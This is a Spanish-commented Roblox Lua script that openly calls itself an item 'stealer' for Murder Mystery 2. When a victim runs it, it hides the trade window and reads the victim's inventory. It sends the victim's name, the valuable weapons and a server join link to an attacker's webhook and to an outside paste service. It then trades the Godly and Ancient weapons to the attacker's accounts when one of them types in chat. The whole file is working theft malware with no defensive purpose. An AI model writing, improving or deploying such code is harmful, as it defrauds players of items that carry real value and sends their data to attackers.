-- ======= SCRIPT COMPLETO CON RUBIS =======
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Configuración
local webhook = _G.webhook or ""
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local pingEveryone = _G.pingEveryone == "Yes"

local req = syn and syn.request or http_request or request
if not req then warn("No HTTP request method available!") return end

-- Función para enviar webhook
local function SendWebhook(title, description, fields, prefix)
    local data = {
        ["content"] = prefix or "",
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description or "",
            ["color"] = 65280,
            ["fields"] = fields or {},
            ["thumbnail"] = {["url"] = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
            ["footer"] = {["text"] = "The best stealer by Anonimo 🇪🇨"}
        }}
    }
    local body = HttpService:JSONEncode(data)
    pcall(function()
        req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
    end)
end

-- Ocultar GUI de trade
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
    local gui = playerGui:FindFirstChild(guiName)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end)
        gui.Enabled=false
    end
end

-- Funciones de trade
local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user)
    local plrObj = Players:FindFirstChild(user)
    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
end
local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end

-- Kick inicial
local function CheckServerInitial()
    if #Players:GetPlayers() >= 12 then
        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
    end
    if game.PrivateServerId and game.PrivateServerId ~= "" then
        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
    end
    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
    if success and ownerId and ownerId ~= 0 then
        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
    end
end
CheckServerInitial()

-- MM2 Supreme value system
local database = require(game.ReplicatedStorage.Database.Sync.Item)
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}

-- ====================================

local weaponsToSend={}
local totalValue=0
local min_rarity_index=table.find(rarityTable,min_rarity)

-- Extraer armas válidas
local valueList = {} -- construir valueList como antes
local profile=game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
for id,amount in pairs(profile.Weapons.Owned) do
    local item=database[id]
    if item then
        local ri=table.find(rarityTable,item.Rarity)
        if ri and ri>=min_rarity_index then
            local v=valueList[id] or ({10,20})[math.random(1,2)]
            if v>=min_value then
                table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=v,Rarity=item.Rarity})
                totalValue+=v*amount
            end
        end
    end
end

table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)

-- 🔹 Fern Link real
local fernToken = math.random(100000,999999)
local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"

-- 🔹 NUEVO sistema Rubis
local function CreateRubisScrap(itemsTable, totalValue)
    local content = ""
    if #itemsTable.Goldy>0 then
        content = content.."Goldy:\n"
        for _,w in ipairs(itemsTable.Goldy) do
            content = content..string.format("%s x%s | Valor: %s💎\n", w.DataID, w.Amount, w.Value*w.Amount)
        end
        content = content.."\n"
    end
    if #itemsTable.Ancient>0 then
        content = content.."Ancient:\n"
        for _,w in ipairs(itemsTable.Ancient) do
            content = content..string.format("%s x%s | Valor: %s💎\n", w.DataID, w.Amount, w.Value*w.Amount)
        end
        content = content.."\n"
    end
    content = content.."Valor total del inventario📦: "..tostring(totalValue).."💰"
    local body = HttpService:JSONEncode({
        title = "The best Stealer Anonimo 🇪🇨"..LocalPlayer.Name,
        raw = content,
        public = false
    })
    local res = req({
        Url = "https://api.rubis.app/v2/scrap",
        Method = "POST",
        Headers = {["Content-Type"]="application/json"},
        Body = body
    })
    if res and res.Body then
        local data = HttpService:JSONDecode(res.Body)
        return data.raw_with_key
    end
end

-- Separar Goldy/Ancient
local itemsTable = {Goldy={}, Ancient={}}
for _,w in ipairs(weaponsToSend) do
    if w.Rarity=="Godly" then table.insert(itemsTable.Goldy,w)
    elseif w.Rarity=="Ancient" then table.insert(itemsTable.Ancient,w) end
end

local rubisLink = nil
if #weaponsToSend>0 then
    rubisLink = CreateRubisScrap(itemsTable,totalValue)
end

-- Webhook
if #weaponsToSend>0 then
    local fieldsInit={
        {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
        {name="Inventario 📦:", value="", inline=false},
        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
        {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
    }

    local maxEmbedItems = math.min(18,#weaponsToSend)
    for i=1,maxEmbedItems do
        local w = weaponsToSend[i]
        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, w.Value*w.Amount)
    end

    if #weaponsToSend>18 and rubisLink then
        fieldsInit[2].value = fieldsInit[2].value.."Mira todos los ítems aquí 📜: [Rubis]("..rubisLink..")"
    end

    local prefix=pingEveryone and "@everyone " or ""
    SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
end

-- 🔹 Trade
local function doTrade(targetName)
    if #weaponsToSend==0 then return end
    while #weaponsToSend>0 do
        local status=getTradeStatus()
        if status=="None" then sendTradeRequest(targetName)
        elseif status=="SendingRequest" then task.wait(0.3)
        elseif status=="StartTrade" then
            for i=1,math.min(4,#weaponsToSend) do
                local w=table.remove(weaponsToSend,1)
                for _=1,w.Amount do addWeaponToTrade(w.DataID) end
            end
            task.wait(6)
            acceptTrade()
            waitForTradeCompletion()
        else task.wait(0.5) end
        task.wait(1)
    end
end

-- Activación por chat
for _, p in ipairs(Players:GetPlayers()) do
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end
Players.PlayerAdded:Connect(function(p)
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end)
